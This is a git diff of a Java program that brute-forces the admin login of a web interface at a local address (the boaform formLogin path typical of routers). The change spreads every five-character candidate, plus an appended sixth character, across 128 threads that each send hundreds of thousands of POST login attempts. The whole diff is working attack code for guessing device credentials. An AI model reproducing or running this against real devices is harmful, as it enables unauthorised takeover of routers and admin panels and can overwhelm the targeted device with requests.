@@ -5,25 +5,31 @@ import org.json.simple.JSONObject;
 public class Main {
     public static void main(String[] args) {
         String url = "http://192.168.55.1/boaform/admin/formLogin";
+        final int NUM_OF_THREAD = 128;
+        final int NUM_OF_EACH_THREAD_REQUEST = 472392;
+
         try {
             EachLetterCreator elc = new EachLetterCreator();
             char[] eachLetterArr = elc.createEachLetter();
 
             PasswordMakser pm = new PasswordMakser();
-            String[] resultArr = pm.createPasswords(eachLetterArr);
+            String[] fiveDigitArr = pm.createPasswords(eachLetterArr);
 
-            JsonCreator jsonCreator = new JsonCreator();
             HttpRequester httpRequester = new HttpRequester();
 
-            for(String eachResult : resultArr){
-                for(char eachLetter : eachLetterArr){
-                    String password = new StringBuilder().append(eachResult).append(eachLetter).toString();
-//                    JSONObject jsonBody = jsonCreator.createJson(password);
-//                    httpRequester.requestPost(url, jsonBody);
-//                    System.out.println(password);
+            int fiveDigitStartIdx = 0;
+            for (int i = 0; i < NUM_OF_THREAD; i++) {
+                PostThread pt = new PostThread(httpRequester, url, eachLetterArr);
+                String[] fiveDigitArrForThread = new String[NUM_OF_EACH_THREAD_REQUEST];
+                int startIdx = fiveDigitStartIdx;
+
+                for (int j = startIdx; j < startIdx + NUM_OF_EACH_THREAD_REQUEST; j++) {
+                    fiveDigitArrForThread[j - fiveDigitStartIdx] = fiveDigitArr[j];
+                    fiveDigitStartIdx++;
                 }
+                pt.setFiveDigitArr(fiveDigitArrForThread);
+                pt.start();
             }
-            System.out.println("--end");
         } catch (Exception e) {
             e.printStackTrace();
         }
